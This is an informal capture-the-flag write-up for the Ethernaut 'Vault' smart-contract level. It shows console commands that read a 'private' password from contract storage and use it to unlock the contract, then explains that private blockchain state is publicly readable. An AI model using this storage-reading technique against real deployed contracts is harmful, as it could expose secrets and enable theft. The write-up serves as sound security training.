we aims to unlock the contract, but i suffered a bug :
  that is :
  creation of Vault errored: Error encoding arguments: Error: invalid arrayify value (argument="value", value="Howareyou1234", code=INVALID_ARGUMENT, version=bytes/5.5.0)


console:

web3.eth.getStorageAt(contract.address,1, function(x,y) {alert(web3.utils.toAscii(y))})
    //show the passward on the top of the edge

contract.unlock(web3.utils.fromAscii("A very strong secret password :)"))
    //this code is a right method to solve this level, i suddenly try to use web3.utils and find this way, there is no way to solve this level at now unless use my way.
    //  2022/4/1

await contract.locked()
    //true -> false,successful attack
    
It's important to remember that marking a variable as private only prevents other contracts from accessing it. 
State variables marked as private and local variables are still publicly accessible.
To ensure that data is private, it needs to be encrypted before being put onto the blockchain. 
In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. 
ZK-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.
